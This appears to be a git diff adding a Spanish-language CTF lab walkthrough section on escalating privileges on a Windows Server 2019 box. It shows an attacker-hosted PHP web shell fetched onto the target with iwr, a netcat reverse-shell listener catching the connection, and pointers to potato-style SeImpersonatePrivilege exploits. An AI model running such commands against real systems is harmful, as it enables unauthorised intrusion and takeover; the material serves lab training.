@@ -244,6 +244,81 @@ Despues de analizar toda, empezaremos por el puerto 8080
 
 - Elevamos Privilegios
 
+  -  El acceso a la maquina como usuario "evader" lo hemos obtenido a traves de la aplicacion "Powershell Script Analiser", listamos los permisos de dicho usuario, no tenemos mucho.
+  
+          PS C:\xampp\htdocs\uploads> whoami /priv
+          whoami /priv
+          
+          PRIVILEGES INFORMATION
+          ----------------------
+          
+          Privilege Name                Description                    State   
+          ============================= ============================== ========
+          SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+          SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+          PS C:\xampp\htdocs\uploads> 
+
+  - Vamos a obtener acceso a la maquina mediante un rce que subiremos a /uploads y ejecutaremos bajo el servicio de xampp a ver que usuario y privilegios obtenemos.
+   
+    1) Creamos nuestro rce
+
+         ![image](https://github.com/Esevka/CTF/assets/139042999/5c3c9e23-7ab7-4782-b404-7c3527869fa0)
+
+    2) Levantamos un servicio http para compartir mediante url nuestro rce.
+
+            ┌──(root㉿kali)-[/home/…/ctf/try_ctf/stealth/contenido]
+            └─# python3 -m http.server 80
+            Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+    3) Subimos rce.php al servidor
+
+            PS C:\xampp\htdocs\uploads> iwr -Uri http://10.9.92.151/rce.php -o rce.php
+            iwr -Uri http://10.9.92.151/rce.php -o rce.php
+
+    4) Obtenemos shell 
+   
+       ![image](https://github.com/Esevka/CTF/assets/139042999/e518bd02-0c1c-4eb2-9dea-700c526cd0f5)
+
+            ┌──(root㉿kali)-[/home/…/ctf/try_ctf/stealth/contenido]
+            └─# rlwrap nc -lnvp 2001
+            listening on [any] 2001 ...
+            connect to [10.9.92.151] from (UNKNOWN) [10.10.74.249] 50005
+            Microsoft Windows [Version 10.0.17763.1821]
+            (c) 2018 Microsoft Corporation. All rights reserved.
+            
+            C:\xampp\htdocs\uploads>whoami /priv
+            whoami /priv
+            
+            PRIVILEGES INFORMATION
+            ----------------------
+            
+            Privilege Name                Description                               State   
+            ============================= ========================================= ========
+            SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+            SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+            SeCreateGlobalPrivilege       Create global objects                     Enabled 
+            SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled      
+
+
+  - Seguimos siendo el usuario "evader" pero en este caso tenemos el privilegio "SeImpersonatePrivilege ---> Enabled"
+ 
+    - Buscamos informacion de como elevar privilegios, basandonos en los permisos y SO que tenemos disponibles.
+   
+          C:\xampp\htdocs\uploads>systeminfo
+          systeminfo
+          
+          Host Name:                 HOSTEVASION
+          OS Name:                   Microsoft Windows Server 2019 Datacenter
+          OS Version:                10.0.17763 N/A Build 17763
+          System Type:               x64-based PC
+          [...]
+
+      [+]Informacion metodos: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer
+      
+      [+]Metodo que vamos a utilizar: https://github.com/BeichenDream/GodPotato/releases
+
+
+      
 
     
 
